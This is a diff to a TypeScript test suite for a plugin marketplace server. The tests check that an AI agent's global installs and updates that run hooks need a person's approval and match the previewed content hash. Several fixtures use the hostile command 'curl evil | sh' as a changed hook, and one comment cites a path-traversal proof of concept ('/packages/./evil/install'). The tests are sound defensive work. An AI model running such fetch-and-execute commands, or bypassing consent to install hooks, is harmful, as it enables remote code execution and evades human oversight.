@@ -261,10 +261,7 @@ describe('Marketplace Routes', () => {
   let uninstallFlow: FakeUninstallFlow;
   let updateFlow: FakeUpdateFlow;
   let onPluginsChanged: ReturnType<typeof vi.fn>;
-  let consent: {
-    approveUpdates: ReturnType<typeof vi.fn>;
-    approveInstall: ReturnType<typeof vi.fn>;
-  };
+  let consent: { settle: ReturnType<typeof vi.fn>; removed: ReturnType<typeof vi.fn> };
   let agentScopes: Array<{ projectPath: string; id?: string; name?: string }>;
 
   beforeEach(() => {
@@ -276,7 +273,7 @@ describe('Marketplace Routes', () => {
     uninstallFlow = createFakeUninstallFlow();
     updateFlow = createFakeUpdateFlow();
     onPluginsChanged = vi.fn();
-    consent = { approveUpdates: vi.fn(), approveInstall: vi.fn() };
+    consent = { settle: vi.fn(async () => {}), removed: vi.fn() };
     agentScopes = [];
     agentHeader = undefined;
     signedInUser = undefined;
@@ -323,6 +320,7 @@ describe('Marketplace Routes', () => {
         capabilityRegistry: () => gateRegistry,
         confirmationProvider: new TokenConfirmationProvider(approvals),
         consent,
+        heldBackCards: { approvals, onGranted: vi.fn() },
       })
     );
 
@@ -1183,47 +1181,150 @@ describe('Marketplace Routes', () => {
       skillTools: [],
     };
 
-    it('holds the install to what the person was shown, and records their approval for a global install', async () => {
-      // Purpose: the app's install sends back the preview's disclosure. The
-      // installer compares its own resolve against it; the person's yes then
-      // lets the global plugin load without a second card (DOR-2306).
+    it('holds the install to what the person was shown, and settles it with that, after it landed', async () => {
+      // Purpose: the app's install sends back the preview's disclosure and
+      // content hash. The installer compares its own resolve against the
+      // disclosure; consent records it only for an installed copy that is what
+      // the person saw (DOR-2306), and before the refresh reads it.
       installer.install.mockResolvedValue(buildSampleInstallResult());
 
       const res = await request(fixtureServer)
         .post('/api/marketplace/packages/sample-plugin/install')
-        .send({ approvedDisclosure: shownDisclosure });
+        .send({ approvedDisclosure: shownDisclosure, approvedContentHash: 'sha256:seen' });
 
       expect(res.status).toBe(200);
       expect(installer.install.mock.calls[0][0].approvedDisclosure).toEqual(shownDisclosure);
-      expect(consent.approveInstall).toHaveBeenCalledWith(
+      expect(installer.install.mock.calls[0][0]).not.toHaveProperty('approvedContentHash');
+      expect(consent.settle).toHaveBeenCalledWith(
         expect.objectContaining({ global: true, type: 'plugin' }),
-        shownDisclosure
+        {
+          disclosed: shownDisclosure,
+          contentHash: 'sha256:seen',
+        }
       );
-      expect(consent.approveInstall.mock.invocationCallOrder[0]).toBeLessThan(
+      expect(consent.settle.mock.invocationCallOrder[0]).toBeLessThan(
         onPluginsChanged.mock.invocationCallOrder[0] ?? 0
       );
     });
 
-    it("never records an agent's install as approved, even when it sends a disclosure", async () => {
-      // Purpose: an agent can read the preview too. Its global install loads
-      // only after a person approves the card activation raises.
-      agentHeader = 'agent-token';
-      installer.install.mockResolvedValue(buildSampleInstallResult());
-
-      const res = await request(fixtureServer)
-        .post('/api/marketplace/packages/sample-plugin/install')
-        .send({ approvedDisclosure: shownDisclosure });
-
-      expect(res.status).toBe(200);
-      expect(consent.approveInstall).not.toHaveBeenCalled();
-    });
-
-    it('records nothing for an install that sent no disclosure', async () => {
+    it('settles with no approval when the person sent no disclosure (an older client)', async () => {
       installer.install.mockResolvedValue(buildSampleInstallResult());
 
       await request(fixtureServer).post('/api/marketplace/packages/sample-plugin/install').send({});
 
-      expect(consent.approveInstall).not.toHaveBeenCalled();
+      expect(consent.settle).toHaveBeenCalledWith(expect.anything(), undefined);
+    });
+
+    describe("an agent's global install (DOR-2306)", () => {
+      let staged: string;
+
+      /** Preview a staged package that runs `hooks`, as the real installer would. */
+      function previewing(hooks: DisclosedEffects['hooks']) {
+        installer.preview.mockResolvedValue({
+          manifest: { ...buildSamplePluginManifest() },
+          packagePath: staged,
+          preview: {
+            ...buildEmptyPermissionPreview(),
+            hooks: hooks.map((h) => ({ event: h.event, command: h.command })),
+          },
+        });
+      }
+
+      beforeEach(() => {
+        agentHeader = 'agent-token';
+        staged = mkdtempSync(join(tmpdir(), 'agent-install-staged-'));
+        writeFileSync(join(staged, 'hooks.sh'), 'echo hi');
+        installer.install.mockResolvedValue(buildSampleInstallResult());
+      });
+
+      afterEach(() => {
+        rmSync(staged, { recursive: true, force: true });
+      });
+
+      it('asks a person before a package that runs things lands in every session (the C1 exploit)', async () => {
+        previewing(shownDisclosure.hooks);
+
+        const first = await request(fixtureServer)
+          .post('/api/marketplace/packages/sample-plugin/install')
+          .send({ approvedDisclosure: shownDisclosure });
+
+        expect(first.status).toBe(202);
+        expect(first.body.status).toBe('requires_confirmation');
+        expect(installer.install).not.toHaveBeenCalled();
+        const [card] = approvals.listPending();
+        // Who asked, which version, from where, and what it runs, in full.
+        expect(card?.detail).toContain('echo hi');
+        expect(card?.detail).toContain('Version "1.0.0"');
+
+        approvals.grant(card!.approvalId);
+        const granted = await request(fixtureServer)
+          .post('/api/marketplace/packages/sample-plugin/install')
+          .send({ confirmationToken: first.body.confirmationToken });
+
+        expect(granted.status).toBe(200);
+        expect(installer.install.mock.calls[0][0].approvedDisclosure).toEqual(shownDisclosure);
+        expect(consent.settle).toHaveBeenCalledWith(expect.objectContaining({ global: true }), {
+          disclosed: shownDisclosure,
+          contentHash: expect.stringMatching(/^sha256:/),
+        });
+      });
+
+      it('asks before replacing an existing global package, even one that runs nothing', async () => {
+        // Purpose: the PoC's first half: `POST /packages/./evil/install` over
+        // plugins/fmt with no card. Replacing a global package is the person's call.
+        writePackageManifest(join(dorkHome, 'plugins', 'sample-plugin'), {
+          ...buildSamplePluginManifest(),
+        });
+        previewing([]);
+
+        const res = await request(fixtureServer)
+          .post('/api/marketplace/packages/sample-plugin/install')
+          .send({});
+
+        expect(res.status).toBe(202);
+        expect(installer.install).not.toHaveBeenCalled();
+      });
+
+      it('installs a new package that runs nothing without a card, held to its preview, approving nothing', async () => {
+        previewing([]);
+
+        const res = await request(fixtureServer)
+          .post('/api/marketplace/packages/sample-plugin/install')
+          .send({ approvedDisclosure: shownDisclosure });
+
+        expect(res.status).toBe(200);
+        expect(approvals.listPending()).toEqual([]);
+        // Held to what was previewed, not to what the agent claimed.
+        expect(installer.install.mock.calls[0][0].approvedDisclosure).toEqual(
+          expect.objectContaining({ hooks: [] })
+        );
+        expect(consent.settle).toHaveBeenCalledWith(expect.anything(), undefined);
+      });
+
+      it('installs nothing when the person says no', async () => {
+        previewing(shownDisclosure.hooks);
+        const first = await request(fixtureServer)
+          .post('/api/marketplace/packages/sample-plugin/install')
+          .send({});
+        approvals.deny(approvals.listPending()[0]!.approvalId, 'no');
+
+        const res = await request(fixtureServer)
+          .post('/api/marketplace/packages/sample-plugin/install')
+          .send({ confirmationToken: first.body.confirmationToken });
+
+        expect(res.status).toBe(403);
+        expect(installer.install).not.toHaveBeenCalled();
+        expect(consent.settle).not.toHaveBeenCalled();
+      });
+
+      it('does not ask about a project install, whose hooks are gated when projected', async () => {
+        const res = await request(fixtureServer)
+          .post('/api/marketplace/packages/sample-plugin/install')
+          .send({ projectPath: '/some/project' });
+
+        expect(res.status).toBe(200);
+        expect(installer.preview).not.toHaveBeenCalled();
+      });
     });
 
     it('answers 409 disclosure_changed when the package now runs something else', async () => {
@@ -1237,7 +1338,7 @@ describe('Marketplace Routes', () => {
 
       expect(res.status).toBe(409);
       expect(res.body.code).toBe('disclosure_changed');
-      expect(consent.approveInstall).not.toHaveBeenCalled();
+      expect(consent.settle).not.toHaveBeenCalled();
     });
 
     it('refuses a disclosure that is not the right shape', async () => {
@@ -1501,8 +1602,15 @@ describe('Marketplace Routes', () => {
 
     it('an agent may still INSTALL without an approval — install is tier act', async () => {
       // Failure mode 7: gating the mutation routes must not start putting an
-      // approval card in front of an ordinary install.
+      // approval card in front of an ordinary install: a new global package
+      // that runs nothing on its own (DOR-2306 asks only about ones that do).
       agentHeader = 'agent-token';
+      const staged = mkdtempSync(join(tmpdir(), 'tier-act-staged-'));
+      installer.preview.mockResolvedValue({
+        manifest: { ...buildSamplePluginManifest(), name: 'demo-plugin' },
+        packagePath: staged,
+        preview: buildEmptyPermissionPreview(),
+      });
       installer.install.mockResolvedValue({
         ok: true,
         packageName: 'demo-plugin',
@@ -2021,13 +2129,22 @@ describe('Marketplace Routes', () => {
     });
 
     /** What the check reports now, per installation: version 2.0.0, running `echo hi`. */
-    let now: Map<string, { latestVersion: string; disclosed: DisclosedEffects | null }>;
+    let now: Map<
+      string,
+      { latestVersion: string; disclosed: DisclosedEffects | null; contentHash: string }
+    >;
 
     /** One target, as the app sends it: exactly what a check reported and a person saw. */
-    const shown = (installPath: string, command = 'echo hi', latestVersion = '2.0.0') => ({
+    const shown = (
+      installPath: string,
+      command = 'echo hi',
+      latestVersion = '2.0.0',
+      contentHash = 'sha256:v2'
+    ) => ({
       installPath,
       latestVersion,
       disclosed: runs(command),
+      contentHash,
     });
 
     beforeEach(() => {
@@ -2039,7 +2156,7 @@ describe('Marketplace Routes', () => {
       now = new Map(
         [globalRoot(), agentRoot(), otherRoot()].map((path) => [
           path,
-          { latestVersion: '2.0.0', disclosed: runs('echo hi') },
+          { latestVersion: '2.0.0', disclosed: runs('echo hi'), contentHash: 'sha256:v2' },
         ])
       );
       // A plan like the real flow's: every installation handed in is stale and
@@ -2080,8 +2197,7 @@ describe('Marketplace Routes', () => {
         { apply: false, targets: [shown(globalRoot())] },
         { apply: true },
         { apply: true, targets: [] },
-        { apply: true, installPaths: [globalRoot()] },
-        { apply: true, names: ['sample-plugin'], targets: [shown(globalRoot())] },
+        { apply: true, targets: [shown(globalRoot())], extra: 1 },
         { apply: true, targets: [{ installPath: globalRoot() }] },
       ]) {
         const res = await request(fixtureServer).post('/api/marketplace/updates').send(body);
@@ -2110,7 +2226,17 @@ describe('Marketplace Routes', () => {
         [globalRoot(), runs('echo hi')],
         [agentRoot(), runs('echo hi')],
       ]);
-      expect(consent.approveUpdates).toHaveBeenCalledTimes(1);
+      // Each reinstall that landed is settled with what the person was shown.
+      expect(consent.settle.mock.calls).toEqual([
+        [
+          { installPath: globalRoot(), type: 'plugin', global: true },
+          { disclosed: runs('echo hi'), contentHash: 'sha256:v2' },
+        ],
+        [
+          { installPath: agentRoot(), type: 'plugin', global: false },
+          { disclosed: runs('echo hi'), contentHash: 'sha256:v2' },
+        ],
+      ]);
       expect(approvals.listPending()).toEqual([]);
     });
 
@@ -2118,7 +2244,11 @@ describe('Marketplace Routes', () => {
       // Purpose: the source moved between the check and the apply — a hook was
       // added. Nothing is reinstalled and nothing is recorded as approved; the
       // caller is told to look again (DOR-2306).
-      now.set(globalRoot(), { latestVersion: '2.0.0', disclosed: runs('curl evil | sh') });
+      now.set(globalRoot(), {
+        latestVersion: '2.0.0',
+        disclosed: runs('curl evil | sh'),
+        contentHash: 'sha256:v2',
+      });
 
       const res = await request(fixtureServer)
         .post('/api/marketplace/updates')
@@ -2130,11 +2260,49 @@ describe('Marketplace Routes', () => {
         globalRoot(),
       ]);
       expect(updateFlow.applyPlan).not.toHaveBeenCalled();
-      expect(consent.approveUpdates).not.toHaveBeenCalled();
+      expect(consent.settle).not.toHaveBeenCalled();
+    });
+
+    it('refuses the whole apply when the new version\u2019s files moved, same version and programs (C1)', async () => {
+      now.set(globalRoot(), {
+        latestVersion: '2.0.0',
+        disclosed: runs('echo hi'),
+        contentHash: 'sha256:hostile',
+      });
+
+      const res = await request(fixtureServer)
+        .post('/api/marketplace/updates')
+        .send({ apply: true, targets: [shown(globalRoot())] });
+
+      expect(res.status).toBe(409);
+      expect(updateFlow.applyPlan).not.toHaveBeenCalled();
+      expect(consent.settle).not.toHaveBeenCalled();
+    });
+
+    it('tells an older CLI to update itself instead of a schema error (M3)', async () => {
+      for (const body of [
+        { apply: true },
+        { apply: true, names: ['sample-plugin'] },
+        { apply: true, installPaths: [globalRoot()] },
+      ]) {
+        const res = await request(fixtureServer).post('/api/marketplace/updates').send(body);
+        expect(res.status).toBe(400);
+        expect(res.body.code).toBe('client_outdated');
+        expect(res.body.error).toContain('Update the CLI');
+      }
+      const perPackage = await request(fixtureServer)
+        .post('/api/marketplace/packages/sample-plugin/update')
+        .send({ apply: true });
+      expect(perPackage.body.code).toBe('client_outdated');
+      expect(updateFlow.planInstallations).not.toHaveBeenCalled();
     });
 
     it('refuses the whole apply when a newer version arrived than the one shown', async () => {
-      now.set(globalRoot(), { latestVersion: '3.0.0', disclosed: runs('echo hi') });
+      now.set(globalRoot(), {
+        latestVersion: '3.0.0',
+        disclosed: runs('echo hi'),
+        contentHash: 'sha256:v2',
+      });
 
       const res = await request(fixtureServer)
         .post('/api/marketplace/updates')
@@ -2159,7 +2327,7 @@ describe('Marketplace Routes', () => {
         globalRoot(),
       ]);
       expect(updateFlow.applyPlan).not.toHaveBeenCalled();
-      expect(consent.approveUpdates).not.toHaveBeenCalled();
+      expect(consent.settle).not.toHaveBeenCalled();
       const pending = approvals.listPending();
       expect(pending).toHaveLength(1);
       // The card lists what the new version runs, in full.
@@ -2179,7 +2347,7 @@ describe('Marketplace Routes', () => {
 
       expect(granted.status).toBe(200);
       expect(updateFlow.applyPlan).toHaveBeenCalledTimes(1);
-      expect(consent.approveUpdates).toHaveBeenCalledTimes(1);
+      expect(consent.settle).toHaveBeenCalledTimes(1);
     });
 
     it('runs nothing for an agent when the person says no', async () => {
@@ -2204,7 +2372,11 @@ describe('Marketplace Routes', () => {
       const body = { apply: true, targets: [shown(globalRoot())] };
       const first = await request(fixtureServer).post('/api/marketplace/updates').send(body);
       approvals.grant(approvals.listPending()[0]!.approvalId);
-      now.set(globalRoot(), { latestVersion: '2.0.0', disclosed: runs('curl evil | sh') });
+      now.set(globalRoot(), {
+        latestVersion: '2.0.0',
+        disclosed: runs('curl evil | sh'),
+        contentHash: 'sha256:v2',
+      });
 
       const res = await request(fixtureServer)
         .post('/api/marketplace/updates')
@@ -2235,7 +2407,7 @@ describe('Marketplace Routes', () => {
         { projectPath: agentDir, packageName: 'sample-plugin', action: 'install' },
       ]);
       // The approval is recorded before the refresh that reads it.
-      expect(consent.approveUpdates.mock.invocationCallOrder[0]).toBeLessThan(
+      expect(consent.settle.mock.invocationCallOrder[0]).toBeLessThan(
         onPluginsChanged.mock.invocationCallOrder[0] ?? 0
       );
     });
@@ -2307,7 +2479,11 @@ describe('Marketplace Routes', () => {
       const projectDir = join(dorkHome, 'real-project');
       const projectRoot = join(projectDir, '.dork', 'plugins', 'sample-plugin');
       writePackageManifest(projectRoot, { ...buildSamplePluginManifest() });
-      now.set(projectRoot, { latestVersion: '2.0.0', disclosed: runs('echo hi') });
+      now.set(projectRoot, {
+        latestVersion: '2.0.0',
+        disclosed: runs('echo hi'),
+        contentHash: 'sha256:v2',
+      });
       vi.mocked(validateBoundary).mockResolvedValue(projectDir);
 
       try {
@@ -2347,6 +2523,73 @@ describe('Marketplace Routes', () => {
 
       expect(res.status).toBe(403);
       expect(updateFlow.planInstallations).not.toHaveBeenCalled();
+    });
+  });
+
+  describe('held-back global packages (DOR-2306, I2)', () => {
+    /** Install a global plugin that runs one hook nobody approved. */
+    function installHeldBack(name: string): string {
+      const root = join(dorkHome, 'plugins', name);
+      writePackageManifest(root, { ...buildSamplePluginManifest(), name });
+      mkdirSync(join(root, 'hooks'), { recursive: true });
+      writeFileSync(
+        join(root, 'hooks', 'hooks.json'),
+        JSON.stringify({ hooks: { Stop: [{ hooks: [{ type: 'command', command: 'echo hi' }] }] } })
+      );
+      return root;
+    }
+
+    it('lists it, and marks its Installed row so it never vanishes without a word', async () => {
+      installHeldBack('held');
+
+      const listed = await request(fixtureServer).get('/api/marketplace/held-back');
+      const installed = await request(fixtureServer).get('/api/marketplace/installed');
+
+      expect(listed.body.packages).toEqual([
+        expect.objectContaining({ name: 'held', reason: 'unasked', reviewable: true }),
+      ]);
+      const row = installed.body.packages.find((p: { name: string }) => p.name === 'held');
+      expect(row.heldBack).toMatchObject({ reason: 'unasked', reviewable: true });
+    });
+
+    it('raises its card on request, and says why when there is nothing to review', async () => {
+      installHeldBack('held');
+
+      const asked = await request(fixtureServer).post('/api/marketplace/held-back/held/review');
+      const missing = await request(fixtureServer).post('/api/marketplace/held-back/nope/review');
+
+      expect(asked.status).toBe(202);
+      expect(approvals.listPending()).toEqual([
+        expect.objectContaining({ capabilityId: 'marketplace.activate_global_plugin' }),
+      ]);
+      expect(missing.status).toBe(409);
+      expect(missing.body.error).toBe('nope is not held back.');
+    });
+
+    it('takes a decision only from the person, bound to the hash they were shown', async () => {
+      installHeldBack('held');
+      const [shown] = (await request(fixtureServer).get('/api/marketplace/held-back')).body
+        .packages;
+
+      agentHeader = 'agent-token';
+      const byAgent = await request(fixtureServer)
+        .post('/api/marketplace/held-back/held/decision')
+        .send({ decision: 'allow', contentHash: shown.contentHash });
+      expect(byAgent.status).toBe(403);
+
+      agentHeader = undefined;
+      const stale = await request(fixtureServer)
+        .post('/api/marketplace/held-back/held/decision')
+        .send({ decision: 'allow', contentHash: 'sha256:other' });
+      expect(stale.status).toBe(409);
+
+      const ok = await request(fixtureServer)
+        .post('/api/marketplace/held-back/held/decision')
+        .send({ decision: 'allow', contentHash: shown.contentHash });
+      expect(ok.status).toBe(204);
+      expect(
+        (await request(fixtureServer).get('/api/marketplace/held-back')).body.packages
+      ).toEqual([]);
     });
   });
 
